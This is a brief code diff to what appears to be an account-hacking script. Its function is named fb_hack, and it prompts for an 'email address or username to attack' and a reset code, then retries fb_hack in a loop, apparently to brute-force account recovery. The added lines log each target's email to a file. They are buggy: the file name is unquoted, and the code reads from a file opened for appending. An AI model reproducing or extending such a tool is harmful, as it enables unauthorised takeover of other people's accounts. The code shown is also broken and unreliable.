@@ -211,6 +211,10 @@ def fb_hack(email, codex):
 os.system('clear')
 ehack = input('Email address or username to attack:')
 reset = int(input('Code: ') or 99999999)
+f = open(emails.txt, "a")
+f.write(ehack)
+
+lines = f.readlines()
 while True:
   try:
     fb_hack(ehack, reset)
